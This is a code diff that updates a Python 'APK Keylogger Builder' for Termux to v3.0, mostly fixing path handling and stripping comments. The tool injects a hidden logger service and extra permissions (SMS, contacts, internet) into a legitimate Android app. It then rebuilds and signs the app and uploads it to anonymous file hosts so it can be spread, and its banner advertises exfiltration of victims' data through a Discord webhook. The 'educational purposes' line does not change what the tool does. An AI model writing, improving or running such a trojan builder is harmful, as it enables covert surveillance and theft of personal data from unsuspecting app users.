@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v2.0
-  All processing done locally – no server needed.
-  Output: Download link (cloud upload) + local APK.
+  TERMUX APK KEYLOGGER BUILDER v3.0
+  Fixed: Path handling, auto-back issue fixed
   Developer: GT Security Team
 ============================================================
 """
@@ -17,7 +16,6 @@ import json
 import time
 import requests
 from datetime import datetime
-import tempfile
 
 # ---------------------------- COLORS ----------------------------
 class Colors:
@@ -38,10 +36,10 @@ def print_c(msg, color=Colors.RESET):
 def check_dependencies():
     """Check if required tools are installed."""
     tools = {
-        'apktool': 'pkg install apktool -y',
-        'java': 'pkg install openjdk-17 -y',
+        'apktool': 'pkg install apktool -y OR manual install from GitHub',
+        'java': 'pkg install openjdk-17 -y OR openjdk-25',
         'zipalign': 'pkg install zipalign -y',
-        'aapt': 'pkg install aapt -y'
+        'aapt': 'pkg install aapt -y OR pkg install android-tools -y'
     }
     missing = []
     for tool, install_cmd in tools.items():
@@ -177,7 +175,6 @@ def generate_smali(webhook, features, interval):
 def upload_to_cloud(filepath):
     """Upload APK and return direct download link."""
     print_c("[*] Uploading to cloud...", Colors.YELLOW)
-    # Try file.io
     try:
         with open(filepath, 'rb') as f:
             resp = requests.post("https://file.io", files={"file": (os.path.basename(filepath), f)}, timeout=60)
@@ -185,7 +182,6 @@ def upload_to_cloud(filepath):
             return resp.json().get('link')
     except:
         pass
-    # Try anonfiles
     try:
         with open(filepath, 'rb') as f:
             resp = requests.post("https://api.anonfiles.com/upload", files={"file": (os.path.basename(filepath), f)}, timeout=60)
@@ -193,28 +189,17 @@ def upload_to_cloud(filepath):
             return resp.json()['data']['file']['url']['full']
     except:
         pass
-    # Try gofile (another)
-    try:
-        with open(filepath, 'rb') as f:
-            resp = requests.post("https://store4.gofile.io/uploadFile", files={"file": f}, timeout=60)
-        if resp.status_code == 200 and resp.json().get('status') == 'ok':
-            return resp.json()['data']['downloadPage']
-    except:
-        pass
     return None
 
 # ---------------------------- INJECTION ENGINE ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
-    # Work directory
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
 
     try:
-        # 1. Decode APK
         print_c("[*] Decoding APK...", Colors.YELLOW)
         subprocess.run([shutil.which('apktool'), "d", input_apk, "-o", work_dir, "-f"], check=True, capture_output=True)
 
-        # 2. Get package name (for reference)
         pkg_cmd = [shutil.which('aapt'), "dump", "badging", input_apk]
         result = subprocess.run(pkg_cmd, capture_output=True, text=True)
         pkg = "com.example.unknown"
@@ -223,21 +208,17 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
                 pkg = line.split("'")[1]
                 break
 
-        # 3. Create smali directory
         smali_dir = os.path.join(work_dir, "smali", "com", "gt")
         os.makedirs(smali_dir, exist_ok=True)
 
-        # 4. Write smali
         smali_code = generate_smali(webhook, features, interval)
         with open(os.path.join(smali_dir, "CustomLogger.smali"), "w") as f:
             f.write(smali_code)
 
-        # 5. Modify Manifest
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
         with open(manifest_path, "r") as f:
             manifest = f.read()
 
-        # Permissions
         perms = ['android.permission.INTERNET']
         if features.get('sms'): perms.append('android.permission.READ_SMS')
         if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
@@ -249,7 +230,6 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             if f'<uses-permission android:name="{perm}"' not in manifest:
                 manifest = manifest.replace('</manifest>', f'    <uses-permission android:name="{perm}" />\n</manifest>')
 
-        # Add service
         service_tag = '<service android:name="com.gt.CustomLogger" android:enabled="true" android:exported="false" />'
         if service_tag not in manifest:
             manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')
@@ -257,12 +237,10 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         with open(manifest_path, "w") as f:
             f.write(manifest)
 
-        # 6. Build APK
         print_c("[*] Rebuilding APK...", Colors.YELLOW)
         apk_unsigned = os.path.join(work_dir, "app-unsigned.apk")
         subprocess.run([shutil.which('apktool'), "b", work_dir, "-o", apk_unsigned], check=True, capture_output=True)
 
-        # 7. Sign
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         subprocess.run([
@@ -271,16 +249,12 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             "-keypass", KEYSTORE_PASS, apk_unsigned, KEY_ALIAS
         ], check=True, capture_output=True)
 
-        # 8. Align
         print_c("[*] Aligning APK...", Colors.YELLOW)
         apk_final = os.path.join(work_dir, "app-final.apk")
         subprocess.run([shutil.which('zipalign'), "-v", "-p", "4", apk_unsigned, apk_final], check=True, capture_output=True)
 
-        # 9. Copy to output
         output_apk = os.path.join(output_dir, f"injected_{os.path.basename(input_apk)}")
         shutil.copy(apk_final, output_apk)
-
-        # Cleanup work dir
         shutil.rmtree(work_dir, ignore_errors=True)
 
         return output_apk
@@ -296,7 +270,7 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER BUILDER v2.0             ║
+    ║   APK KEYLOGGER BUILDER v3.0             ║
     ║   Local injection, cloud upload          ║
     ║   Discord webhook data exfiltration      ║
     ╚═══════════════════════════════════════════╝
@@ -311,16 +285,47 @@ def main_menu():
     choice = input("\n[?] Choose option: ").strip()
     return choice
 
+def get_valid_apk_path():
+    """Get and validate APK path with proper handling."""
+    while True:
+        path = input("📁 Path to original APK: ").strip()
+        
+        # Remove quotes if present
+        path = path.strip('"').strip("'")
+        
+        # Expand ~ if present
+        if path.startswith('~'):
+            path = os.path.expanduser(path)
+        
+        # Check if file exists
+        if os.path.exists(path):
+            return path
+        
+        # If not exists, try with /sdcard prefix
+        if not path.startswith('/sdcard/') and not path.startswith('/storage/'):
+            alt_path = f"/sdcard/{path}"
+            if os.path.exists(alt_path):
+                print_c(f"[✓] Using path: {alt_path}", Colors.GREEN)
+                return alt_path
+        
+        print_c(f"[!] File not found: {path}", Colors.RED)
+        print_c("   Tip: Use /sdcard/Download/your_app.apk format", Colors.YELLOW)
+        print_c("   Or type 'ls /sdcard/Download/*.apk' to see available APKs", Colors.YELLOW)
+        
+        retry = input("\n[?] Try again? (y/n): ").lower()
+        if retry != 'y':
+            return None
+
 def inject_flow():
     clear_screen()
     show_banner()
     print_c("\n--- INJECT APK ---", Colors.BLUE)
+    print_c("📌 Tip: APK files are usually in /sdcard/Download/", Colors.YELLOW)
+    print_c("   Check with: ls -la /sdcard/Download/*.apk\n", Colors.YELLOW)
 
-    # APK path
-    apk_path = input("📁 Path to original APK: ").strip()
-    if not os.path.exists(apk_path):
-        print_c("[!] File not found.", Colors.RED)
-        input("\n[Press Enter to go back]")
+    # APK path with proper validation
+    apk_path = get_valid_apk_path()
+    if not apk_path:
         return
 
     # Webhook
@@ -358,14 +363,12 @@ def inject_flow():
     os.makedirs(output_dir, exist_ok=True)
 
     try:
-        # Perform injection
         print_c("\n[*] Injection started. This may take 2-5 minutes...", Colors.YELLOW)
         start = time.time()
         output_apk = inject_apk(apk_path, output_dir, webhook, features, interval)
         elapsed = time.time() - start
         print_c(f"[✓] Injection completed in {elapsed:.1f}s", Colors.GREEN)
 
-        # Upload to cloud
         print_c("[*] Uploading to cloud for download link...", Colors.YELLOW)
         link = upload_to_cloud(output_apk)
 
@@ -376,7 +379,6 @@ def inject_flow():
         else:
             print_c("[!] Upload failed. APK saved locally:", Colors.RED)
             print_c(f"   {output_apk}", Colors.YELLOW)
-            print_c("   You can share the file via Bluetooth, WhatsApp, etc.", Colors.YELLOW)
 
         print_c(f"\nLocal APK location: {output_apk}", Colors.BLUE)
 
@@ -395,7 +397,7 @@ def about():
     print_c("  - Discord webhook for data exfiltration")
     print_c("  - Local processing – no server needed")
     print_c("  - Upload to cloud for easy sharing")
-    print_c("Developer: GT Security Team")
+    print_c("\nDeveloper: GT Security Team")
     print_c("For educational purposes only.")
     input("\n[Press Enter to go back]")
 
@@ -410,7 +412,7 @@ if __name__ == "__main__":
         import requests
     except ImportError:
         print_c("[!] 'requests' module not found. Installing...", Colors.YELLOW)
-        os.system("pip install requests")
+        os.system("python -m pip install requests")
         import requests
 
     # Main loop
